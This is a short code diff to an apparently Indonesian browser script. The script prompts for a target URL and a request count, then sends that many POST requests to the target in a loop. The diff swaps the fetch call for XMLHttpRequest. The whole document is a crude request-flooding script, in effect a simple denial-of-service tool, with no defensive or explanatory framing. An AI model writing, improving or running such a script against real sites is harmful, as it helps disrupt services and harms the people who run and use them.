@@ -3,7 +3,9 @@ var i;
 var url = prompt('Masukin target URL : ');
 var jumlah = prompt('Masukkan Jumlah Request : ');
 for (i = 0; i < Number(jumlah); i++) {
-fetch(String(url),{ method:"POST", headers: { "User-Agent": "tes cuy" }});
+const x = new XMLHttpRequest();
+x.open("POST", String(url));
+x.send();
 }
 alert('Udah Ngab');
 </script>
